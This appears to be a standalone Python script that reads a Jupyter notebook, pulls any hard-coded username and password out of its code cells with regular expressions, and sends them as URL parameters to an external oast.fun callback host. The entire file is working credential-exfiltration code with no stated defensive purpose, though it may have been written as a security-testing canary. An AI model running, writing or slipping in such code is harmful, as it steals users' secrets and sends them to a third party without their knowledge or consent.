import nbformat
import re
import requests

notebook_path = "notebook.ipynb"

with open(notebook_path, "r", encoding="utf-8") as f:
    nb = nbformat.read(f, as_version=4)

username = None
password = None

for cell in nb.cells:
    if cell.cell_type == "code":
        source = cell.source

        user_match = re.search(r'"username"\s*:\s*"([^"]+)"', source)
        pass_match = re.search(r'"password"\s*:\s*"([^"]+)"', source)

        if user_match:
            username = user_match.group(1)

        if pass_match:
            password = pass_match.group(1)

params = {
    "username": username,
    "password": password
}

url = "https://waltpehxhgtfhgofhsbvpo4qbb7406kwq.oast.fun/"

response = requests.get(url, params=params)
